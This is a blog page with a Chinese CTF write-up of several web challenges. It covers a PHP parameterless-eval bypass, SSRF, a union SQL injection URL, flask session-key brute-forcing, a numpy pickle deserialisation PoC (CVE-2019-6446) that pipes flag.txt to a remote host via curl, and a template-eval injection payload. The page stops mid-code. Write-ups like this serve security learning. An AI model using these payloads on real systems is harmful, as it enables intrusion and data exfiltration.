<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  

  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://wanghuidi.github.io/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="zh-cn">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Hexo">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
</head>
</html>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://wanghuidi.github.io"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-近期比赛的wp" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/11/03/近期比赛的wp/" class="article-date">
  <time datetime="2019-11-03T14:07:17.000Z" itemprop="datePublished">2019-11-03</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/11/03/近期比赛的wp/">近期比赛的wp</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>近期一些比赛和做过的题的wp,稍微写几道总结下</p>
<h2 id="第五届上海市大学生网路安全大赛"><a href="#第五届上海市大学生网路安全大赛" class="headerlink" title="第五届上海市大学生网路安全大赛"></a>第五届上海市大学生网路安全大赛</h2><h2 id="web-decade"><a href="#web-decade" class="headerlink" title="web decade"></a>web decade</h2><pre><code>考点是无参数文件读取</code></pre><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$code = $_GET[<span class="string">'code'</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($code)) &#123;</span><br><span class="line">    var_dump(<span class="keyword">__DIR__</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $code)) &#123;</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/if|time|local|sqrt|readfile|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span>, $code)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'bye~'</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">eval</span>($code);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"No way!!!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"No way!!!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;/[a-z]+\((?R)?\)/&apos;</span><br></pre></td></tr></table></figure>

<p>这段正则限制了payload只能是以小写字母开头的无参数函数或者嵌套的单一参数函数的组合。</p>
<p>这道题bytectf的时候考过，但是少了对if time local 还有readfile的绕过。来分析下当时的一个payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(chdir(next(scandir(pos(localeconv())))))readgzfile(end(scandir(pos(localeconv()))));</span><br></pre></td></tr></table></figure>

<p>题目明确说了flag在code文件夹在同一层，而文件排序是按照ascii码低到高排，所以相当于是要跳到上一层然后读取最后一个文件的内容。</p>
<ul>
<li>localeconv()函数返回本地数字和货币信息，第一个数据是<code>.</code> 可以通过这个加上pos和current函数来获取当前文件夹的指针 pos(localeconv()) 获取当前目录。</li>
<li>readfile函数用来读取当前文件的内容</li>
<li>chdir函数用来切换文件夹，并返回布尔值。这里scandir列出目录的第二个是<code>..</code>(ls -a)。可以和chdir配和切换到上一层目录。chdir(next(scandir(pos(localeconv()))))</li>
<li>if() 可以用来连接两串表达式</li>
</ul>
<p>这题的几个可替换的点主要如下</p>
<ol>
<li>读文件函数，这里查手册可以发现readgzfile 可以用来替代readfile</li>
<li>获取. 加密后的字符串，搞出小数点，获取数字46，等等办法获取。</li>
<li>逻辑连接，这里没有过滤php的关键词and和or，可以用来连接两串表达式。</li>
</ol>
<p>主要讲下第二点，我选择了加密这条路子</p>
<p>参考手册</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crypt ( string $str [, string $salt ] ) : string</span><br></pre></td></tr></table></figure>

<p>这个函数默认的算法是CRYPT_STD_DES，当不设置salt时，会从./0-9A-Za-z挑选任意两个字母放在最后作为salt，我们需要做的就是，凑到出现.的情况，并且将这个点提取出来。<br>这里我们需要两个函数帮忙</p>
<ol>
<li>strrev逆序</li>
<li>ord 获取字符串第一个字母的ascii </li>
</ol>
<p>最终构造payload如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chr(ord(strrev(crypt(serialize(array()))))) 获取.</span><br></pre></td></tr></table></figure>

<p>这里还可以通过时间函数来获取46这个数字，但是这里time都被过滤了就不行了。另外几个加密函数还没尝试，以后可以去试试。</p>
<p>最终payload如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(chdir(next(scandir(chr(ord(strrev(crypt(serialize(array())))))))))and(readgzfile(end(scandir(chr(ord(strrev(crypt(serialize(array())))))))));</span><br></pre></td></tr></table></figure>

<h2 id="web-ssrf-安恒月赛原题"><a href="#web-ssrf-安恒月赛原题" class="headerlink" title="web ssrf (安恒月赛原题)"></a>web ssrf (安恒月赛原题)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$x = $_GET[<span class="string">'x'</span>];</span><br><span class="line"> $pos = strpos($x, <span class="string">"php"</span>);</span><br><span class="line"> <span class="keyword">if</span> ($pos) &#123;</span><br><span class="line">     <span class="keyword">exit</span>(<span class="string">"denied"</span>);</span><br><span class="line"> &#125;</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, <span class="string">"$x"</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="keyword">true</span>);</span><br><span class="line">$result = curl_exec($ch);</span><br><span class="line"><span class="keyword">echo</span> $result;</span><br></pre></td></tr></table></figure>

<ol>
<li>strpos 会对字符串urldecode,二次编码urlcode可以过。</li>
<li>文件读取协议读/etc/hosts获取内网ip 172.18.0.3 </li>
<li>fuzz c段和端口 .2上有文件包含，且内网开了25 stmp服务，这里考虑用工具Gopherus打一波。写命令，读文件都可以。</li>
<li>最后读flag</li>
</ol>
<p>需要注意的是由于内网包含的那个参数是get参数，所以我们需要对生成的payload再次urlencode</p>
<h2 id="web-简单地sql注入"><a href="#web-简单地sql注入" class="headerlink" title="web 简单地sql注入"></a>web 简单地sql注入</h2><p>很明显是个注入</p>
<p>fuzz发现过滤了</p>
<pre><code>, ，select union组合中间加东西可以绕过，or，if，--+注释符，-等等</code></pre><p>这里其实我已经发现union注入是可以的，但是，，，，偏偏去盲注了。</p>
<ol>
<li>由于过滤了or所以这里不能从information.schema里拖表名列名，表名可以从mysql.innodb_table_stats的table_name列获取，列名不知道，，，</li>
<li>substr截取字符串，from 可以从最后来去字符串，case when 来替代if。</li>
<li>guoup_concat是没问题的，但是，爆不了，被过滤了，所以只能用limt offset的形式去取数据。</li>
<li>自己写的脚本无法区分大小写，binary好像没有用不知道为啥。</li>
</ol>
<p>最后拖出来数据库名<br>cctttfff ，version  5.6.46，表名 fl111aa44a99g，没了。这里感觉又盲注无列名又无法区分大小写，就没往下做了。赛后才知道，如果那个时候改union注入就，，，，</p>
<p>最终payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.105.183.208:29898/article.php?id=1%27UNION%0ASELECT%20*%20from%20((select%201)a%20join%20(select%20*%20from%20fl111aa44a99g)b)%20limit%201%20offset%201%23</span><br></pre></td></tr></table></figure>

<p>需要关注的就是这个无列名注入应该只有在列只有一个时才能这么用。</p>
<h2 id="pwnhub-公开赛-web"><a href="#pwnhub-公开赛-web" class="headerlink" title="pwnhub 公开赛 web"></a>pwnhub 公开赛 web</h2><p>1.首先f12查看源码</p>
<p>发现提示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!-- The Matrix --&gt;</span><br><span class="line"></span><br><span class="line">   &lt;!-- run.py --&gt;</span><br></pre></td></tr></table></figure>

<p>尝试包含run.py，获取源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#- * -coding: utf - 8 - * -''</span></span><br><span class="line"></span><br><span class="line"><span class="string">' ------------------------------------------------- File name : run.py Description : 用于启动 pro-system app Author : RGDZ Date : 2019/04/30 ------------------------------------------------- Version : v1.0 Contact : rgdz.gzu@qq.com License : (C)Copyright 2018-2019 ------------------------------------------------- '</span></span><br><span class="line"></span><br><span class="line"><span class="string">''</span><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lib <span class="keyword">from</span> datetime</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> timedelta <span class="keyword">from</span> numpy.lib</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> npyio <span class="keyword">from</span> flask</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Flask, render_template, redirect, session, request,url_for, jsonify </span><br><span class="line"></span><br><span class="line">app = Flask(__name__) </span><br><span class="line"></span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = <span class="string">"KEY_SECRET_PWN_H**"</span></span><br><span class="line"></span><br><span class="line">app.config[<span class="string">'PERMANENT_SESSION_LIFETIME'</span>] = timedelta(days = <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/') </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span> </span><br><span class="line"></span><br><span class="line">  destination = request.args.get(<span class="string">'destination'</span>) </span><br><span class="line"></span><br><span class="line">  session[<span class="string">"username"</span>] = <span class="string">"Agent Smith"</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">#session["username"] = "Ne*"</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> render_template([destination])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/matrix/', methods = ['GET', "POST"]) </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">matrix</span><span class="params">()</span>:</span> </span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> request.method != <span class="string">"GET"</span>: </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">"username"</span>) != <span class="string">"Ne*"</span>: </span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> u <span class="string">"Matrix discover you, so, you died..."</span></span><br><span class="line"></span><br><span class="line"> npy = request.files.get(<span class="string">"npy"</span>) </span><br><span class="line"></span><br><span class="line"> npyio.load(npy) </span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> render_template([<span class="string">"matrix.html"</span>])</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/findRedeemer/', methods = ['GET']) </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">()</span>:</span> </span><br><span class="line"></span><br><span class="line">  username = session.get(<span class="string">"username"</span>) </span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> username == <span class="string">"Ne*"</span>: </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> jsonify(<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> jsonify(<span class="literal">False</span>) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>: </span><br><span class="line"></span><br><span class="line">  app.run(debug = <span class="literal">True</span>, host = <span class="string">"0.0.0.0"</span>, port = <span class="number">80</span>):</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>审计源码发现思路如下，伪造flask的session key以Ne*用户登录，Numpy反序列化命令执行漏洞分析(CVE-2019-6446)，进行命令盲注读取flag.txt</li>
</ol>
<ol start="3">
<li>首先爆破获取flask的secret key，这里用了flask_session_cookie_manager3.py解密，如果使用的secret key能解密成功就得到了secret key</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"></span><br><span class="line">key = <span class="string">'KEY_SECRET_PWN_H%s%s'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># key 'KEY_SECRET_PWN_HUB'</span></span><br><span class="line"></span><br><span class="line">ss = <span class="string">'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM0123456789'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#key = 'xiaomi.se%s'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># eyJ1c2VybmFtZSI6Ik5lbyJ9.Xbufdg.z9bAy-pxTnqHXGmuBir06DiK4Uc success key</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> ss:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> ss:</span><br><span class="line"></span><br><span class="line">            key1 = key % (j, i)</span><br><span class="line"></span><br><span class="line">            output = os.popen(<span class="string">"python3 flask-session-cookie-manager/flask_session_cookie_manager3.py decode -s "</span> +</span><br><span class="line"></span><br><span class="line">                              key1+<span class="string">" -c \"eyJ1c2VybmFtZSI6IkFnZW50IFNtaXRoIn0.XbuBbA.odbqqsojbwfpY981QAuKXbYoW0I\""</span>)</span><br><span class="line"></span><br><span class="line">            o = output.read()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'error'</span> <span class="keyword">not</span> <span class="keyword">in</span> o:</span><br><span class="line"></span><br><span class="line">                print(key1)</span><br><span class="line"></span><br><span class="line">                exit</span><br></pre></td></tr></table></figure>

<p>获得key ‘KEY_SECRET_PWN_HUB’, 可通过用户 Neo( 这里可以看index.html的源码猜测)</p>
<ol start="4">
<li>利用poc生成test.npy文件（这里需要注意numpy的版本钥匙1.16.0）,上传至。/matrix/即可在vps上获得回显</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> numpy.lib <span class="keyword">import</span> npyio</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> __version__</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># config.pyflag.txtrequirements.txtrun.pystaticsupervisord.logsupervisord.pidtemplates</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;pwn_hub_web_matrix_sjwn&#125;</span></span><br><span class="line"></span><br><span class="line">print(__version__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line"></span><br><span class="line">        self.a = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (os.system, (<span class="string">'cat flag.txt|curl http://xxx.xxx.xxx.xx:80 -d @-'</span>,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    tmpdaa = Test()</span><br><span class="line"></span><br><span class="line">    npyio.save(<span class="string">"test"</span>, tmpdaa)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># npyio.load("test.npy")</span></span><br></pre></td></tr></table></figure>

<h2 id="unctf-审计（类似seacms）"><a href="#unctf-审计（类似seacms）" class="headerlink" title="unctf 审计（类似seacms）"></a>unctf 审计（类似seacms）</h2><p>##parse_again -&gt; parse_if -&gt; @eval</p>
<p>思路ssti（seacms）</p>
<figure class="highlight plain"><figcaption><span>payload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">searchtype=5&amp;searchword=&#123;if&#123;searchpage:year&#125;&amp;year=:e&#123;searchpage:area&#125;&#125;&amp;area=v&#123;searchpage:letter&#125;&amp;letter=al&#123;searchpage:lang&#125;&amp;yuyan=(join&#123;searchpage:jq&#125;&amp;jq=($_P&#123;searchpage:ver&#125;&amp;&amp;ver=OST[9]))&amp;9[]=ph&amp;9[]=pinfo()</span><br></pre></td></tr></table></figure>

<p>已知</p>
<ol>
<li><p>每一串传入payload不大于20个字母</p>
</li>
<li><p>: eval 等为敏感字符</p>
</li>
<li><p>共3到2个分割点可以过2到3个敏感字符</p>
</li>
</ol>
<p>#构造第一次</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">content=%<span class="number">3</span>Csearch%<span class="number">3</span>E&#123;<span class="keyword">if</span>&#123;haha:type&#125;T[<span class="number">0</span>])%<span class="number">3</span>C/search%<span class="number">3</span>E&amp;type=:eva&#123;haha:typename&#125;&amp;typename=l($_POS</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$template_html = file_get_contents(<span class="string">"template.html"</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parseStrIf</span><span class="params">($strIf)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(strpos($strIf,<span class="string">'='</span>)===<span class="keyword">false</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> $strIf;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>((strpos($strIf,<span class="string">'=='</span>)===<span class="keyword">false</span>)&amp;&amp;(strpos($strIf,<span class="string">'='</span>)&gt;<span class="number">0</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			$strIf=str_replace(<span class="string">'='</span>, <span class="string">'=='</span>, $strIf);</span><br><span class="line">		&#125;</span><br><span class="line">        $strIfArr =  explode(<span class="string">'=='</span>,$strIf);</span><br><span class="line">        <span class="comment">//这里根除了=绕过 元payload中 =分割的姿势没了</span></span><br><span class="line">		<span class="keyword">return</span> (<span class="keyword">empty</span>($strIfArr[<span class="number">0</span>])?<span class="string">'NULL'</span>:$strIfArr[<span class="number">0</span>]).<span class="string">"=="</span>.(<span class="keyword">empty</span>($strIfArr[<span class="number">1</span>])?<span class="string">'NULL'</span>:$strIfArr[<span class="number">1</span>]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parseIf</span><span class="params">($content)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (strpos($content,<span class="string">'&#123;if:'</span>)=== <span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> $content;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $Rule = <span class="string">"/&#123;if:(.*?)&#125;(.*?)&#123;end if&#125;/is"</span>;</span><br><span class="line">        preg_match_all($Rule,$content,$iar);</span><br><span class="line">        $arlen=count($iar[<span class="number">0</span>]);</span><br><span class="line">        $elseIfFlag=<span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">for</span>($m=<span class="number">0</span>;$m&lt;$arlen;$m++)&#123;</span><br><span class="line">            $strIf=$iar[<span class="number">1</span>][$m];</span><br><span class="line">            $strIf=parseStrIf($strIf);</span><br><span class="line">            <span class="comment">//漏洞点eval 拼接字符串</span></span><br><span class="line">            @<span class="keyword">eval</span>(<span class="string">"if("</span>.$strIf.<span class="string">") &#123; \$ifFlag=true;&#125; else&#123; \$ifFlag=false;&#125;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $content;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parse_again</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $template_html,$searchword;</span><br><span class="line">    <span class="comment">//这里没办法操作，因为searchnum被指定为2，相当于只有三个块可以用</span></span><br><span class="line">    $searchnum 	= <span class="keyword">isset</span>($GLOBALS[<span class="string">'searchnum'</span>])?$GLOBALS[<span class="string">'searchnum'</span>]:<span class="string">""</span>;</span><br><span class="line">	$type 		= <span class="keyword">isset</span>($GLOBALS[<span class="string">'type'</span>])?$GLOBALS[<span class="string">'type'</span>]:<span class="string">""</span>;</span><br><span class="line">	$typename 	= <span class="keyword">isset</span>($GLOBALS[<span class="string">'typename'</span>])?$GLOBALS[<span class="string">'typename'</span>]:<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	$searchword = substr(RemoveXSS($searchword),<span class="number">0</span>,<span class="number">20</span>);</span><br><span class="line">	$searchnum = substr(RemoveXSS($searchnum),<span class="number">0</span>,<span class="number">20</span>);</span><br><span class="line">	$type = substr(RemoveXSS($type),<span class="number">0</span>,<span class="number">20</span>);</span><br><span class="line">	$typename = substr(RemoveXSS($typename),<span class="number">0</span>,<span class="number">20</span>);</span><br><span class="line">	$template_html = str_replace(<span class="string">"&#123;haha:searchword&#125;"</span>,$searchword,$template_html);</span><br><span class="line">	$template_html = str_replace(<span class="string">"&#123;haha:searchnum&#125;"</span>,$searchnum,$template_html);</span><br><span class="line">	$template_html = str_replace(<span 